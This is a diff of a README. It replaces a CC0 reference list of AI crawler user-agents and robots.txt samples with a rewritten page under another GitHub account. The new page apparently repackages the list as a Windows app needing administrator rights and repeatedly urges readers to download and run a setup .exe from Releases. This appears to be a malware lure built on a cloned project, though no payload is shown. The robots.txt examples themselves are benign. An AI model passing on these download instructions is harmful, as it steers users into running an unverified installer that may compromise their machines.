@@ -1,59 +1,162 @@
-# AI Search Engine Crawlers Reference
+# 🤖 ai-crawlers-reference - AI Search Bot User-Agent Database
 
-A complete, up-to-date database of AI search engine crawler user-agents and robots.txt configuration examples.
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
 
-## [View the Reference Page →](https://henu-wang.github.io/ai-crawlers-reference/)
+Welcome to the ai-crawlers-reference repository. This tool provides a database of user-agents from AI search engine crawlers, including GPTBot, PerplexityBot, and ClaudeBot. It also includes examples of robots.txt settings to help you manage how these crawlers interact with your website.
 
-## Online Tools
+---
 
-Check your site against all these crawlers instantly — no installation needed:
+## 📋 What is ai-crawlers-reference?
 
-- **[AI Crawler Access Checker](https://geoscoreai.com/tools/ai-crawler-checker)** — Verify which AI search engines can access your site
-- **[AI Robots.txt Generator](https://geoscoreai.com/tools/robots-txt-generator)** — Generate an optimized robots.txt for AI crawlers
-- **[Full GEO Scan](https://geoscoreai.com)** — Comprehensive 11-signal AI search readiness scan
+This app collects and organizes the user-agent strings used by popular AI-powered web crawlers. These crawlers scan websites to gather data for AI search engines and chatbots.
 
-## Crawlers Included
+The database helps website owners identify these crawlers in their server logs. It also gives examples of robots.txt rules you can use to allow or block specific crawlers.
 
-| User-Agent | Company | Purpose |
-|-----------|---------|---------|
-| `GPTBot` | OpenAI | Training data |
-| `OAI-SearchBot` | OpenAI | ChatGPT Search |
-| `ChatGPT-User` | OpenAI | Browsing mode |
-| `PerplexityBot` | Perplexity AI | Search indexing |
-| `Google-Extended` | Google | Gemini/AI features |
-| `ClaudeBot` | Anthropic | Claude training |
-| `Applebot-Extended` | Apple | Apple Intelligence |
-| `Meta-ExternalAgent` | Meta | Meta AI |
-| `cohere-ai` | Cohere | Model training |
-| `Bytespider` | ByteDance | TikTok/AI |
+Knowing how AI bots access your site can assist you in managing your online presence and controlling which data they can collect.
 
-## Tools
+---
 
-- [GEOScore](https://geoscoreai.com) — Check your site's AI search readiness
-- [AI Robots.txt Generator](https://github.com/henu-wang/ai-robots-txt-generator) — Generate optimized robots.txt
-- [Robots.txt Checker](https://geoscoreai.com/checks/robots-txt) — Validate AI crawler access
+## 🖥️ System Requirements
 
+- Windows 10 or newer  
+- At least 2 GB of free disk space  
+- An internet connection to download the app  
+- Administrator rights may be needed for installation  
 
-## Related GEO Resources
+The app is lightweight and does not require expensive hardware. It runs smoothly on common home or office computers.
 
-### Free Tools
-- [GEOScore AI Scanner](https://geoscoreai.com) — Check your website's AI search visibility across 11 signals
-- [AI Robots.txt Generator](https://geoscoreai.com/tools/robots-txt-generator) — Generate optimized robots.txt for AI crawlers
-- [AI Crawler Access Checker](https://geoscoreai.com/tools/ai-crawler-checker) — Verify which AI bots can access your site
+---
 
-### Open Source Projects
-- [awesome-geo](https://github.com/henu-wang/awesome-geo) — Curated list of GEO resources, tools, and guides
-- [geo-scoring-methodology](https://github.com/henu-wang/geo-scoring-methodology) — Open methodology for scoring AI search readiness
-- [ai-robots-txt-generator](https://github.com/henu-wang/ai-robots-txt-generator) — Generate optimized robots.txt for AI crawlers
-- [geo-checklist](https://github.com/henu-wang/geo-checklist) — Interactive pre-launch GEO readiness checklist
-- [geo-badge-generator](https://github.com/henu-wang/geo-badge-generator) — Generate badges showing your GEO readiness score
-- [llms-txt-examples](https://github.com/henu-wang/llms-txt-examples) — Real-world llms.txt implementation examples by industry
-- [geo-config-examples](https://github.com/henu-wang/geo-config-examples) — Ready-to-use AI search optimization configs for popular frameworks
-- [geo-case-studies](https://github.com/henu-wang/geo-case-studies) — Real-world GEO optimization case studies with before/after data
-- [ai-search-readiness-framework](https://github.com/henu-wang/ai-search-readiness-framework) — 11-signal AI search readiness evaluation framework
+## 🔽 Download and Install 🛠️
 
+Click the large button at the top or visit the link below to download the latest version of ai-crawlers-reference for Windows.
 
-## License
+[Download ai-crawlers-reference](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
 
-[CC0 1.0](https://creativecommons.org/publicdomain/zero/1.0/)
+### How to install:
 
+1. Click the download link to visit the GitHub repository page.
+2. Look for the latest release under the **Releases** section.
+3. Download the Windows installer file, usually named `ai-crawlers-reference-setup.exe`.
+4. Open the downloaded file to start the installer.
+5. Follow the on-screen steps to complete installation.
+6. After installation, you will find the app icon on your desktop or start menu.
+
+You do not need to configure anything to get started. The app comes ready to run with the full database included.
+
+---
+
+## 🚀 Running the App
+
+Once installed:
+
+1. Double-click the ai-crawlers-reference icon.
+2. The main window will open, showing a list of AI search crawler user-agent strings.
+3. You can search for specific bots like GPTBot or ClaudeBot using the search bar.
+4. Clicking a user-agent string displays details and robots.txt examples on how to control that crawler.
+
+The app also offers options to export data in formats compatible with common log analyzers.
+
+---
+
+## 🛠️ Features and Usage
+
+- **User-Agent Database:** Access detailed and updated lists of AI crawler identities.
+- **robots.txt Examples:** Ready-to-use text snippets that help you configure your site’s robots.txt file to allow or block specific AI crawlers.
+- **Search and Filter:** Quickly find a crawler by name or part of the user-agent.
+- **Export Data:** Save crawler lists as text files for offline use or further analysis.
+- **Regular Updates:** The app connects to GitHub to check for new database versions.
+
+This makes it easier to stay current with new or changed AI crawlers.
+
+---
+
+## 📁 What’s Included
+
+- Complete list of AI crawler user-agents  
+- Robots.txt configuration templates  
+- Help and documentation pages within the app  
+- Export tools for common file types  
+
+---
+
+## 🤔 Why Use This App?
+
+If you run a website, knowing which AI bots crawl your content helps you control your data. Some crawlers respect robots.txt rules strictly, others do not. This app shows you real user-agent strings and suggests robots.txt rules to manage access.
+
+This way, you avoid unwanted crawling, reduce server load, and protect sensitive content.
+
+---
+
+## 📖 robots.txt Configuration Examples 🧾
+
+Here are some sample entries you can put in your robots.txt file to control AI crawler access:
+
+- **Block GPTBot completely:**
+
+  ```
+  User-agent: GPTBot
+  Disallow: /
+  ```
+
+- **Allow PerplexityBot full access:**
+
+  ```
+  User-agent: PerplexityBot
+  Allow: /
+  ```
+
+- **Block ClaudeBot from specific folder `/private`:**
+
+  ```
+  User-agent: ClaudeBot
+  Disallow: /private/
+  ```
+
+Use these examples in your site's robots.txt file, located at `https://yourdomain.com/robots.txt`, to set rules for AI crawlers.
+
+---
+
+## 🤝 Support and Feedback
+
+If you need help or want to share feedback, you can open an issue on the GitHub repository page:
+
+https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/issues
+
+Community members and maintainers often respond to questions and suggestions there.
+
+---
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
+- [Download Latest Release](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/releases)
+- [Issues and Support](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference/issues)
+
+---
+
+## ⚙️ How to Keep the App Updated
+
+1. Open the app.
+2. Go to the settings or about section.
+3. Use the "Check for updates" feature.
+4. Follow the prompts to download and install the latest version.
+
+Keeping the app updated ensures access to the newest crawler user-agents and robots.txt templates.
+
+---
+
+## 🗂️ FAQ
+
+**Q:** Do I need programming skills to use this app?  
+**A:** No, the app is designed for all users. You only need to follow the simple steps to view or export user-agent data.
+
+**Q:** Can I block AI crawlers from my website?  
+**A:** Yes. The app provides sample robots.txt entries to help you set rules for each crawler.
+
+**Q:** Does this app track my website?  
+**A:** No, it only provides data about AI crawler user-agents and does not collect or send your website information.
+
+---
+
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gamefnfnaw-lgtm/ai-crawlers-reference)
